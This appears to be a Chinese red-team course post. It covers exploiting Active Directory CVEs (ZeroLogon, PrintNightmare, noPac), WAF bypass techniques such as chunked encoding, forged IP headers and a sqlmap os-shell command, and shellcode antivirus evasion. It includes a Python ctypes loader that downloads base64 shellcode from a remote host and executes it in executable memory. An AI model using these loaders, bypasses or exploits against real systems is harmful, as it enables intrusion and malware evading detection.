<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716211237197.png" alt="image-20220716211237197"></p>
<hr>
<p><strong>域横向移动—已知漏洞</strong></p>
<p>ZeroLogon(CVE-2020-1472)<br>通过利用该漏洞，可以将域控机器用户的密码置空。利用secretsdump.py来获取凭证<br>漏洞检测&amp;利用：<br>•<a target="_blank" rel="noopener" href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a><br>•<a target="_blank" rel="noopener" href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a><br>•<a target="_blank" rel="noopener" href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a></p>
<p>Windows Print Spooler(CVE-2021-1675)<br>Print Spooler是Windows系统中管理打印相关事务的服务，用于管理所有本地和网络打印队列并控制所有打印工作。Windows系统默认开启Print Spooler服务，普通用户可以利用此漏洞提升至SYSTEM管理权限。在域环境下，域用户可远程利用该漏洞以SYSTEM权限在域控制器上执行任意代码，从而获得整个域的控制权。<br>利用<br>•需要一个普通域用户。<br>•kali开启匿名smb共享：<br>•修改smb服务配置文件/etc/samba/smb.conf。</p>
<p>CVE-2021-42278，机器账户的名字一般来说应该以$结尾，但AD没有对域内机器账户名做验证。<br>CVE-2021-42287，与上述漏洞配合使用，创建与DC机器账户名字相同的机器账户（不以$结尾），账户请求一个TGT后，更名账户，然后通过S4U2self申请TGS Ticket，接着DC在TGS_REP阶段，这个账户不存在的时候，DC会使用自己的密钥加密TGS Ticket，提供一个属于该账户的PAC，然后我们就得到了一个高权限ST。有人也叫这个漏洞为：sAMAccountName spoofing</p>
<p>•创建一个机器账户，这在之前的文章都有所提及，使用impacket的addcomputer.py或是powermad<br>•addcomputer.py是利用SAMR协议创建机器账户，这个方法所创建的机器账户没有SPN，所以可以不用清除<br>•清除机器账户的servicePrincipalName属性<br>•将机器账户的sAMAccountName，更改为DC的机器账户名字，注意后缀不带$<br>•为机器账户请求TGT<br>•将机器账户的sAMAccountName更改为其他名字，不与步骤3重复即可<br>•通过S4U2self协议向DC请求ST<br>•DCsync</p>
<p>•<a target="_blank" rel="noopener" href="https://github.com/ASkyeye/noPac">https://github.com/ASkyeye/noPac</a><br>•<a target="_blank" rel="noopener" href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html">https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html</a><br>•<a target="_blank" rel="noopener" href="https://exploit.ph/more-samaccountname-impersonation.html">https://exploit.ph/more-samaccountname-impersonation.html</a><br>•<a target="_blank" rel="noopener" href="https://gist.github.com/ASkyeye/2c633a20d62b1754bb2f0c4d91f83a92">https://gist.github.com/ASkyeye/2c633a20d62b1754bb2f0c4d91f83a92</a><br>•<a target="_blank" rel="noopener" href="https://github.com/ASkyeye/sam-the-admin">https://github.com/ASkyeye/sam-the-admin</a><br>•<a target="_blank" rel="noopener" href="https://github.com/ASkyeye/Pachine">https://github.com/ASkyeye/Pachine</a></p>
<h2 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h2><p><strong>免杀概述</strong></p>
<p>•免杀是后渗透的基础<br>• 免杀是钓⻥打点的前提<br>• 现代化红蓝对抗的整个攻击周期离不开免杀<br>所以，免杀是红队人员的基本技能</p>
<hr>
<p><strong>Waf简介</strong></p>
<p>waf是web应用防火墙（Web Application Firewall）的简称，对来自Web应用程序客户端的各类请求进行内容检测和验证，确保其安全性与合法性，对非法的请求予以实时阻断，为web应用提供防护，也称作应用防火墙，是网络安全纵深防御体系里重要 的 一 环 。waf 属 于 检 测 型 及 纠 正 型 防 御 控 制 措 施 。 waf 分 为<br>•硬 件 waf<br>•软 件waf（ModSecurity）<br>•代码级waf。</p>
<hr>
<p><strong>软件型WAF</strong></p>
<p>•D盾：<a target="_blank" rel="noopener" href="http://www.d99net.net/">http://www.d99net.net</a><br>•云锁：<a target="_blank" rel="noopener" href="https://yunsuo.qianxin.com/">https://yunsuo.qianxin.com</a><br>•网防：<a target="_blank" rel="noopener" href="http://www.weishi110.cn/static/index.html">http://www.weishi110.cn/static/index.html</a><br>•安全狗：<a target="_blank" rel="noopener" href="https://www.safedog.cn/">https://www.safedog.cn</a><br>•护卫神：<a target="_blank" rel="noopener" href="https://www.hws.com/">https://www.hws.com/</a><br>•智创：<a target="_blank" rel="noopener" href="https://www.zcnt.com/">https://www.zcnt.com/</a><br>•悬镜：<a target="_blank" rel="noopener" href="https://www.xmirror.cn/">https://www.xmirror.cn/</a><br>•UPUPW：<a target="_blank" rel="noopener" href="https://www.upupw.net/">https://www.upupw.net/</a><br>•WTS-WAF：<a target="_blank" rel="noopener" href="https://www.west.cn/">https://www.west.cn/</a><br>•安骑士：<a target="_blank" rel="noopener" href="https://help.aliyun.com/product/28449.html">https://help.aliyun.com/product/28449.html</a><br>•dotDefender：<a target="_blank" rel="noopener" href="http://www.applicure.com/Products/">http://www.applicure.com/Products/</a></p>
<hr>
<p><strong>硬件型waf</strong></p>
<p>•绿盟：<a target="_blank" rel="noopener" href="https://www.nsfocus.com.cn/">https://www.nsfocus.com.cn/</a><br>•安恒：<a target="_blank" rel="noopener" href="https://www.dbappsecurity.com.cn/">https://www.dbappsecurity.com.cn/</a><br>•铱(yi)迅：<a target="_blank" rel="noopener" href="https://www.yxlink.com/">https://www.yxlink.com/</a><br>•天融信<br>•深信服<br>•启明星辰<br>•知道创宇<br>•F5 BIG-IP：<a target="_blank" rel="noopener" href="https://www.f5.com/">https://www.f5.com/</a></p>
<hr>
<p><strong>基于云WAF</strong></p>
<p>•安全宝<br>•创宇盾：<a target="_blank" rel="noopener" href="https://defense.yunaq.com/cyd/">https://defense.yunaq.com/cyd/</a><br>•玄武盾<br>•腾讯云<br>•百度云<br>•西部数码<br>•阿里云盾<br>•奇安信网站卫士</p>
<hr>
<p><strong>Waf原理</strong></p>
<p>waf对请求的内容进行规则匹配、行为分析等识别出恶意行为，并执行相关动作，这些动作包括阻断、记录、告警等。<br>waf工作在web服务器之前，对基于HTTP协议的通信进行检测和识别。通俗的说，waf类似于地铁站的安检，对于HTTP请求进行快速安全检查，通过解析HTTP数据，在不同的字段分别在特征、规则等维度进行判断，判断的结果作为是否拦截的依据从而决定是否放行。从事前、事中、事后来看，waf是在攻击进行时，用于阻断攻击的安全产品。</p>
<p>WAF比较常见的监测机制特点有以下几种。<br>•异常检测协议：拒绝不符合HTTP标准的请求，也可以只允许符合HTTP协议的部分选项通过，也有一些web应用防火墙还可以限定http协议中那些过于松散或未被完全制定的选项。<br>•增强输入验证：增强输入验证，对恶意字符进行拦截。<br>•及时补丁：及时屏蔽掉新型漏洞，避免攻击者进行攻击，主要依靠WAF厂商对新型漏洞的及时响应速度</p>
<p>•基于规则的保护和基于异常的保护：基于规则的保护可以提供各种web应用的安全规则，waf生产商会维护这个规则库，并及时为其更新。用户可以按照这些规则对应用进行全方面检测。还有的产品可以基于合法应用数据建立模型，并以此为依据判断应用数据的异常。但这需要对用户企业的应用具有十分透彻的了解才可能做到<br>•状态管理：能够判断用户是否是第一次访问，将请求重定向到默认登录页面并且记录事件，或对暴力破解行为进行拦截。<br>•其他防护技术：如隐藏表单域保护、抗入侵规避技术、响应监视和信息泄露保护。<br>•配置规则：可以自定义防护的规则，如是否允许“境外ip”的访问</p>
<hr>
<p><strong>Waf识别</strong></p>
<p>WAF绕过不仅要了解WAF检查的原理，还需要识别是什么类型的WAF，不同类型，不同品牌的waf监测机制不一样，绕过的方式也不同。<br>•wafw00f/WhatWaf<br>利用wafw00f识别WAF，可以在WAF指纹目录下自行编写脚本。这类WAF识别工具的原理基本都是根据HTTP头部信息、状态码以及WAF拦截页中的图片、文字做为特征来进行检测，如wafw00f工具中的yunsuo.py脚本就是根据cookie中的security_session_verify来检测的。</p>
<p>利用sqlmap -identify-waf参数识别WAF，一样可以在WAF指纹目录下根据原有脚本和Awesome-WAF项目自行编写WAF指纹识别脚本，但有时可能会因为sqlmap新老版本的原因而导致存放路径不一样。<br>更新前：/usr/share/sqlmap/waf<br>更新后：/usr/share/golismero/tools/sqlmap/waf<br>•项目地址<br>•<a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a><br>•<a target="_blank" rel="noopener" href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>•<a target="_blank" rel="noopener" href="https://github.com/Ekultek/WhatWaf">https://github.com/Ekultek/WhatWaf</a><br>•<a target="_blank" rel="noopener" href="https://github.com/0xInfection/Awesome">https://github.com/0xInfection/Awesome</a></p>
<hr>
<p><strong>Waf绕过</strong></p>
<p>WAF对于一些常规漏洞（如注入漏洞、XSS漏洞、命令执行漏洞、文件包含漏洞）的检测大多是基于“正则表达式”和“AI+规则”的方法，因此会有一定的概率绕过其防御。</p>
<hr>
<p><strong>常规waf绕过—文件上传</strong></p>
<p>•这里以文件上传为例，直观展示 ：</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716212701098.png" alt="image-20220716212701098"></p>
<p>快速判断文件上传漏洞是否客观存在:<br>•01.我们直接前端上传正常文件，burp截断数据包后，尝试修改content-type和任意后缀，来判断黑白名单(eg:1.abc，随机后缀传上去了一般就是黑名单限制)<br>•02.随机后缀传不上去一般就是白名单，检查是否是前端JS限制，F12看一下，如果是前端限制，可以直接修改js。<br>•03.非前端白名单限制的话，只能尝试服务器和中间件的解析漏洞了</p>
<p>判断程序本身限制与WAF限制:<br>•01.程序本身黑名单限制：响应通常会有上传文件格式不允许的字样。<br>•02.WAF限制：返回页面通常会是302跳转WAF的拦截页面或是该次请求被重置reset无响应包。</p>
<p>常规绕过WAF限制：<br>遇见的常见的WAF，在上传阶段检测的字段通常是：<br>•Content-Disposition: form-data; name=”file”; filename=”1.php”<br>针对后缀类绕过的方法：构造当前能识别的正常文件的畸形包(.png)，然后再改后缀，服务器能解析，但是让WAF不认识。这些WAF都能在后缀落地的阶段绕过，各种WAF可能对后缀判断的具体的位置不同：例如某WAF：filename参数去掉引号就可以正常上传，原因是waf未识别到双引号“”内的黑名单文件，但服务器可以忽略进行正常接收解析。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716212804827.png" alt="image-20220716212804827"></p>
<hr>
<p><strong>基于HTTP协议的绕过方式</strong></p>
<p>HTTP隧道传输/ HTTP pipeline<br>通过使用 Connection: keep-alive 达到一次传输多个http包的效果:<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716212853106.png" alt="image-20220716212853106"></p>
<p><strong>基于HTTP协议的绕过方式–分块传输/ Chunked Transfer (HTTP 1.1)</strong></p>
<p>分块传输/ Chunked Transfer (HTTP 1.1)<br>通过在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用0独占一行表示结束。<br>目的：达到敏感参数分割效果<br>没有分块时，传入敏感参数，被waf拦截：</p>
<p>手工进行分块绕过较为繁琐，且花费时间长，面对大量资产的情况，项目时间较为紧张的情况下，还是使用自动化工具来的快捷方便。这里使用sqlmap+burp+burp插件（chunked-coding-converter）。<br>工具的项目地址：<a target="_blank" rel="noopener" href="https://github.com/c0ny1/chunked-coding-converter%E3%80%82">https://github.com/c0ny1/chunked-coding-converter。</a><br>快速使用：burp获取post包后，复制post包，做成post.txt,并放置于sqlmap工具文件下。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716213024873.png" alt="image-20220716213024873"></p>
<p>使用burp 设定插件，开启插件代理：</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716213055773.png" alt="image-20220716213055773"></p>
<p>使用Sqlmap进行代理：sqlmap语句sqlmap.py -r post.txt –proxy=<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> –os-shell</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716213124083.png" alt="image-20220716213124083"></p>
<hr>
<p><strong>基于HTTP协议的绕过方式</strong></p>
<p><strong>ibm037编码/ Charset = xxx编码绕过</strong></p>
<p>利用不常见的特殊编码，绕过waf检测。ibmxxx编码在以下服务或语言中可被解析识别<br>•Nginx, uWSGl-Django-Python2 &amp; 3<br>•Apache-TOMCAT7/8- JVM1.6/1.8-JSP<br>•Apache- PHP5 (mod_ php &amp; FastCGI)<br>•IIS (6, 7.5, 8, 10) on ASP Classic, ASP.NET and PHP7.1- FastCGI</p>
<p><strong>HTTP协议未覆盖：</strong><br>Content-type: multipart/form-date 为什么存在？是为了满足能够既传参数又能传文件的场景；<br>•利用 Content-type: multipart/form-date 绕过上传的边界（boundary）限制<br>通过多boundary定义，使waf检测范围和实际上传范围不一致，从而绕过waf上传恶意内容：<br>•上传参数“file”,绕过waf检测“filename”</p>
<hr>
<p><strong>其他方式–高并发</strong></p>
<p>使用自动化工具短时间内发送大量攻击数据包。对请求进行并发，攻击请求会被负载均衡调度到不同节点，导致某些请求绕过了waf的拦截<br>缺点：动静太大，容易被业务察觉并封禁；</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716213324688.png" alt="image-20220716213324688"></p>
<hr>
<p><strong>其他方式–垃圾数据(脏数据)</strong></p>
<p>用多参数或者无效数据填充请求，超出WAF的检测限制范围，从而绕过防御；</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716213359405.png" alt="image-20220716213359405"></p>
<hr>
<p><strong>其他方式—ip伪造</strong></p>
<p>常见的伪造IP请求头<br>•X-Forwarded-For:127.0.0.1<br>•X-Forwarded-Host:127.0.0.1<br>•X-Client-IP:127.0.0.1<br>•X-remote-IP:127.0.0.1<br>•X-remote-addr:127.0.0.1<br>•True-Client-IP:127.0.0.1<br>•X-Client-IP:127.0.0.1<br>•Client-IP:127.0.0.1<br>•X-Real-IP:127.0.0.1</p>
<hr>
<p><strong>常见中间件漏洞绕过WAF–常规绕WAF思路</strong></p>
<p><strong>错误的HTTP请求头</strong><br>    •类似文件上传时的绕过，通过畸形的HTTP协议头绕过WAF检测。比如绕过某些老版本WAF可以加入请求头：Content-    Encoding:deflate就可以绕过WAF（此方法在文件上传绕过WAF中也适用）<br><strong>通用的JAVA类关键字绕过</strong><br>    •将关键字转换成Unicode或者HEX编码的方式，JAVA程序会自动进行解码，所以在一定程度上能够绕过WAF<br><strong>使用未公开的漏洞利用链</strong><br>    •部分WAF会将公开的漏洞利用链中的关键字设置为黑名单，所以重新找一条利用链吧，自己的才是最香的</p>
<h2 id="webshell免杀"><a href="#webshell免杀" class="headerlink" title="webshell免杀"></a>webshell免杀</h2><p>Webshell免杀–脚本免杀</p>
<h2 id="shellcode免杀"><a href="#shellcode免杀" class="headerlink" title="shellcode免杀"></a>shellcode免杀</h2><p><strong>Shellcode免杀–前置知识：</strong></p>
<p>1.程序内存空间:<br>在冯诺依曼的体系结构中，一个进程必须有：text 段，data 段，bss 段。<br>1)•bss（可读可写）<br>bss 是英文 Block Started by Symbol 的简称，通常是指用来存放程序中未初始化的全局变量的一块内存区域，在程序载入时由内核清 0。BSS 段属于静态内存分配。它的初始值也是由用户自己定义的连接定位文件所确定，用户应该将它定义在可读写的 RAM 区内，源程序中使用 malloc 分配的内存就是这一块，它不是根据 data 大小确定，主要由程序中同时分配内存最大值所确定，不过如果超出了范围，也就是分配失败，可以等空间释放之后再分配。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716214039119.png" alt="image-20220716214039119"></p>
<p>2)、text（只读）<br>text 段是程序代码段，在 AT91 库中是表示程序段的大小，它是由编译器在编译连接时自动计算的，当你在链接定位文件中将该符号放置在代码段后，那么该符号表示的值就是代码段大小，编译连接时，该符号所代表的值会自动代入到源程序中。<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716214112799.png" alt="image-20220716214112799"></p>
<p>3)、data（可读可写）<br>data 包含静态初始化的数据，所有有初值的全局变量和static 变量在 data 区。段的起始位置也是由连接定位文件所确<br>定，大小在编译连接时自动分配，它和你的程序大小没有关系，但和程序使用到的全局变量，常量数量相关。<br>栈(stack)保存函数的局部变量和参数。堆(heap)保存函数内部动态分配内存，是另外一种用来保存程序信息的数据结构，更准确的说是保存程序的动态变量。</p>
<p>2.函数指针:<br>函数指针是指向函数的指针变量。 因此“函数指针”本身首先应是指针变量，只不过该指针变量指向函数。这正如用指针变量可指向整型变量、字符型、数组一样，这里是指向函数。如前所述，C 在编译时，每一个函数都有一个入口地址，该入口地址就是函数指针所指向的地址。有了指向函数的指针变量后，可用该指针变量调用函数，就如同用指针变量可引用其他类型变量一样，在这些概念上是大体一致的。函数指针有两个用途：调用函数和做函数的参数。<br>•函数指针的声明形式：<br><code>void(*pFunction)()</code>,当然，没有参数的情况下也可写成<code> void(*pFunction)(void)</code>或者<code>void(*pFunction)()</code>的形式。那么 pFunction 函数指针的原型就是 <code>void (*)()</code>，即把变量名去掉，因此，对于一个给定的 entry 地址，要把它转换成为函数指针，就是<code>(void(*)())entry</code>。那么调用这个函数指针的方式就是<code>((void(*)())entry)()</code>;</p>
<p>Shellcode定义<br>Shellcode是一段机器指令的集合，通常会被压缩至很小的长度，达到为后续恶意代码铺垫的作用。当然你可以通过msfvenom生成各种用于测试的shellcode。<br>RAW文件<br>RAW 中文意思是原始的、未经加工的，通常使用Cobaltstrike生成的BIN文件。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716214449050.png" alt="image-20220716214449050"></p>
<p>RAW文件是可以直接进行字节操作读取的，因此加载到内存较为方便，通常我一般使用混淆的方式再生成一遍。</p>
<hr>
<p><strong>Shellcode免杀–CS的Payload类型</strong></p>
<p>•Stager是分步式，分阶段的，只用少部分代码来请求和加载payload，cs的加载payload模式为反射加载beacon.dll，但这个beacon.dll并不在可执行文件中，而是在远程C2服务端。<br>•Stageless则是将beacon.dll包含在可执行文件中，并且可能有写额外的操作，于是文件比较大，特征也更明显，但是适合横向不出网机器，因为不出网所以有可能请求不了c2服务端上的beacon.dll。</p>
<hr>
<p><strong>Shellcode免杀–Shellcode Loader原理</strong></p>
<p>一个最基本的 shellcode loader 由以下几个模块组成：<br>(1).shellcode<br>(2).一块有执行权限的内存<br>(3).执行 shellcode 的函数或者方式<br>下图就是一个最简单的 shellcode loader，这个 loader 的流程是这样的：<br>(1).首先我们使用 cobalt strike 或者其他的 c2 工具生成 shellcode，将其复制到buf 的位置。<br>(2).然后我们使用 /section:.data,RWE 去修改 data 段的权限为可读可写可执行。<br>(3).最后使用((void(*)()) &amp;buf)();去执行 shellcode。(将 buf 的首地址(也就是shellcode 的入口地址) 强转为函数指针并执行)。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716214703372.png" alt="image-20220716214703372"></p>
<p>Virustotal 的查杀率为 24/67,如下图所示：</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716214732871.png" alt="image-20220716214732871"></p>
<p>Shellcode<br>我们在用cs生成payload时，会生成一段特定编程语言的代码（以python为例）</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716214826540.png" alt="image-20220716214826540"></p>
<p>里面一长串\xfc样式的16进制代码，这就是子弹shellcode<br>但光有子弹不行，所以我们需要一把枪loader才能让他发挥作用。</p>
<p>这里找了一个网上的python内存加载器 环境：python2.7    主要写的也是关于该加载器的实现原理，和调用参数的分析</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716214915350.png" alt="image-20220716214915350"></p>
<p>ctypes库<br>python的ctypes模块是内建，用来调用系统动态链接库函数的模块<br>使用ctypes库可以很方便地调用C语言的动态链接库，并可以向其传递参数。<br>•import ctypes<br>•import requests<br>•import base64</p>
<p>读取shellcode<br>我是将shellcode生成后，使用base64编码，放在了服务器123.txt文件上，由于后面操作是将代码写入内存，所以需要将代码解码并转为字节类型。<br>•scode = requests.get(“<a target="_blank" rel="noopener" href="http://192.168.1.1/123.txt&quot;">http://192.168.1.1/123.txt&quot;</a>)<br>•shellcode = bytearray(base64.b64decode(scode.text).decode(‘hex’))<br>设置返回类型<br>•我们需要用VirtualAlloc函数来申请内存，返回类型必须和系统位数相同想在64位系统上运行，必须使用restype函数设置VirtualAlloc返回类型为ctypes.c_unit64，否则默认的是 32 位</p>
<p>设置返回类型<br>•我们需要用VirtualAlloc函数来申请内存，返回类型必须和系统位数相同想在64位系统上运行，必须使用restype函数设置VirtualAlloc返回类型为ctypes.c_unit64，否则默认的是 32 位<br>•ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</p>
<p>申请内存<br>调用VirtualAlloc函数，来申请一块动态内存区域。<br>VirtualAlloc函数原型和参数如下：</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">•LPVOID VirtualAlloc&#123;</span><br><span class="line">•LPVOID lpAddress, <span class="meta">#要分配的内存区域的地址</span></span><br><span class="line">•DWORD dwSize, <span class="meta">#分配的大小</span></span><br><span class="line">•DWORD flAllocationType, <span class="meta">#分配的类型</span></span><br><span class="line">•DWORD flProtect <span class="meta">#该内存的初始保护属性</span></span><br><span class="line">•&#125;;</span><br></pre></td></tr></table></figure>

<p>申请一块内存可读可写可执行</p>
<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">•ptr = ctypes.windll.kernel32.<span class="type">VirtualAlloc</span>(ctypes.c_int(0),</span><br><span class="line">•												ctypes.c_int(len(shellcode)),</span><br><span class="line">•												ctypes.c_int(0x3000),</span><br><span class="line">•												ctypes.c_int(0x40))</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716215216130.png" alt="image-20220716215216130"></p>
<p>将shellcode载入内存<br>调用RtlMoveMemory函数，此函数从指定内存中复制内容至另一内存里。<br>RtlMoveMemory函数原型和参数如下:<br>•RtlMoveMemory(Destination,Source,Length);<br>•Destination ：指向移动目的地址的指针。<br>•Source ：指向要复制的内存地址的指针。<br>•Length ：指定要复制的字节数。<br>从指定内存地址将内容复制到我们申请的内存中去，shellcode字节多大就复制多大</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">buf = (ctypes.c_char<span class="operator"> * </span>len(shellcode)).from<span class="constructor">_buffer(<span class="params">shellcode</span>)</span></span><br><span class="line">ctypes.windll.kernel32.<span class="constructor">RtlMoveMemory(<span class="params">ctypes</span>.<span class="params">c_int</span>(<span class="params">ptr</span>)</span>,</span><br><span class="line">											buf,</span><br><span class="line">											ctypes.c<span class="constructor">_int(<span class="params">len</span>(<span class="params">shellcode</span>)</span>))</span><br></pre></td></tr></table></figure>

<p>创建进程<br>调用CreateThread将在主线程的基础上创建一个新线程<br>CreateThread函数原型和参数如下：</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">•HANDLE CreateThread(</span><br><span class="line">•LPSECURITY_ATTRIBUTES lpThreadAttributes,	<span class="meta">#线程安全属性</span></span><br><span class="line">•SIZE_T dwStackSize, 	<span class="meta">#置初始栈的大小，以字节为单位</span></span><br><span class="line">•LPTHREAD_START_ROUTINE lpStartAddress, 	<span class="meta">#指向线程函数的指针</span></span><br><span class="line">•LPVOID lpParameter, 	<span class="meta">#向线程函数传递的参数</span></span><br><span class="line">•DWORD dwCreationFlags, 	<span class="meta">#线程创建属性</span></span><br><span class="line">•LPDWORD lpThreadId	<span class="meta">#保存新线程的id</span></span><br><span class="line">•)</span><br></pre></td></tr></table></figure>

<p>创建一个线程从shellcode放置位置开始执行:</p>
<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">handle</span> = ctypes.windll.kernel32.<span class="type">CreateThread</span>(ctypes.c_int(0),</span><br><span class="line">​											ctypes.c_int(0),</span><br><span class="line">​											ctypes.c_uint64(ptr),</span><br><span class="line">​											ctypes.c_int(0),</span><br><span class="line">​											ctypes.c_int(0),</span><br><span class="line">​											ctypes.pointer(ctypes.c_int(0)))</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716215508110.png" alt="image-20220716215508110"></p>
<p>等待线程结束<br>调用WaitForSingleObject函数用来检测线程的状态<br>WaitForSingleObject函数原型和参数如下：</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">等待线程结束</span><br><span class="line">调用<span class="keyword">WaitForSingleObject函数用来检测线程的状态</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">WaitForSingleObject函数原型和参数如下：</span></span><br><span class="line"><span class="keyword"></span>•DWORD WINAPI <span class="keyword">WaitForSingleObject(</span></span><br><span class="line"><span class="keyword"></span>__in HANDLE hHandle, <span class="comment">#对象句柄。可以指定一系列的对象</span></span><br><span class="line">__in DWORD dwMilliseconds <span class="comment">#定时时间间隔</span></span><br><span class="line">);</span><br><span class="line">等待创建的线程运行结束</span><br><span class="line">ctypes.windll.kernel32.<span class="keyword">WaitForSingleObject(</span></span><br><span class="line"><span class="keyword"></span>				ctypes.c_int(handle),</span><br><span class="line">				ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure>

<p>上面loader大致原理就是申请一块内存，将代码字节存入该内存，然后开始运行该内储存的程序，并让该程序一直运行下去。</p>
<hr>
<p><strong>Shellcode免杀–静态查杀</strong></p>
<p>1.特征码识别:<br>•杀软有自己的病毒库，里面有很多样本，扫描时会抽取扫描对象的一段特征并与病毒库里作比较，如果匹配，那就会认为是病毒。抽取的代码要有适当长度，一方面维持特征代码的唯一性，另一方面又不要有太大的空间与时间的开销。如果一种病毒的特征代码增长一字节，要检测3000种病毒，增加的空间就是3000字节。在保持唯一性的前提下，尽量使特征代码长度短些，以减少空间与时间开销。<br>主要扫描的有：<br>    hash、文件名、函数名、敏感字符串、敏感api等等</p>
<p>2.云查杀:<br>云查杀的不同点在于它的病毒库是放在服务器端的，而不是本地客户端，意思是只要联网病毒库就会同步更新，这种病毒库更加强大。<br>3.校验和法<br>根据正常文件的内容，计算其校验和，定期不定期的检查文件的校验是否与正常的校验和一样。其实本质还是特征码，万变不离其宗</p>
<p>4.启发式扫描：<br>但是面对未知的病毒，换个模样杀软就认不出了吗？所以安全厂商研究出了启发式算法<br>启发式则是将一类病毒总结后，归纳其特征，其后的演变都为一类病毒，这就是启发式算法。具体启发式算法可以由杀软来定，比如可以使用机器学习把家族病毒聚类，或简单的通过使用通用型yara规则，例如文件大小小于100kb，且没有图标则可以识别为病毒，以此达到查杀病毒。</p>
<hr>
<p><strong>Shellcode免杀—免杀姿势</strong></p>
<p>对抗方式：<br>•对 shellcode 进行混淆或加密<br>•分离免杀<br>•API调用隐藏</p>
<p><strong>Shellcode静态免杀—Shellcode加密/混淆</strong></p>
<p>•AES<br>•shellcode 字节替换<br>•Xor<br>•Base64<br>•Crypt1337<br>•字节替换</p>
<hr>
<p><strong>Shellcode免杀—分离免杀</strong></p>
<p>因为shellcode在程序里面很容易被查杀，像下面是最常用的加载shellcode的方式，内联汇编执行，函数指针执行，强制转换等等，当然很明显，这几种现在都是不免杀的。<br>分离免杀包括但不限于<br>•shellcode从文本提取<br>•shellcode与加载器分离<br>•远程加载shellcode（shellcode放在另一台主机上，走http协议下载）<br>•管道运输<br>•隐写在图片上，powershell加载</p>
<p>•<a target="_blank" rel="noopener" href="https://github.com/Hangingsword/HouQing">https://github.com/Hangingsword/HouQing</a><br>该项目是用 Go 语言编写的免杀项目，可以将生成的 Shellcode 隐藏进图片中，然后让目标主机进行远程加载调用。<br>•code.go：用于生成含有 Shellcode 的图片。<br>• Loader.go：用于远程加载图片里的 Shellcode。</p>
<p>管道运输<br>何为管道：管道是通过网络来完成进程间的通信，它屏蔽了底层的网络协议细节。<br>通常与Pipe相关的API都与管道有关，包括Cobaltstrike External C2也是用的管道进行进程通信，一般管道是一个公开的内核对象，所有进程都可以访问。通过一个线程函数充当一个管道客户端，使用管道客户端连接管道，发送Shellcode，然后由管道服务端接收，并反混淆，运行木马线程。</p>
<hr>
<p><strong>Shellcode静态免杀—隐藏IAT</strong></p>
<p>Import Address Table 由于导入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于一个或者多个DLL 中，当PE 文件被装入内存的时候，Windows 装载器才将DLL 装入，并将调用导入函数的指令和函数实际所处的地<br>址联系起来(动态连接)，这操作就需要导入表完成.其中导入地址表就指示函数实际地址。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716220113146.png" alt="image-20220716220113146"></p>
